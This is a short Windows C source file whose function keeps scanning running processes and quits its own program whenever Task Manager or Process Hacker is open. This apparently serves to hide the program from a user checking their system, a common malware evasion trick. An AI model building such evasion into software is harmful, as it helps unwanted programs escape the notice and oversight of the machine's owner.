#include "header.h"

void processWatcher() {
	PROCESSENTRY32 peProcessEntry;
	wchar_t Process[255];
	HANDLE hSnapshot = NULL;


	while (TRUE)
	{
		hSnapshot = CreateToolhelp32Snapshot(
			TH32CS_SNAPPROCESS, 0);
		if (INVALID_HANDLE_VALUE == hSnapshot) {
			CloseHandle(hSnapshot);
			MessageBox(NULL, L"INVALID_HANDLE_VALUE", L"Info", MB_ICONEXCLAMATION);
			ExitProcess(0);
		}

		peProcessEntry.dwSize = sizeof(PROCESSENTRY32);
		Process32First(hSnapshot, &peProcessEntry);
		do {
			wcscpy_s(Process, 255, peProcessEntry.szExeFile);

			for (int i = 0; i < wcslen(Process); i++)
			{
				Process[i] = towlower(Process[i]);
			}

			if ((!wcscmp(Process, L"taskmgr.exe")) || (!wcscmp(Process, L"processhacker.exe")))
			{
				CloseHandle(hSnapshot);
				//MessageBox(NULL, L"DETECTED Task manager!!! Close process!!", L"Info", MB_ICONEXCLAMATION);
				ExitProcess(0);
			}

		} while (Process32Next(hSnapshot, &peProcessEntry));

		CloseHandle(hSnapshot);
	}
}
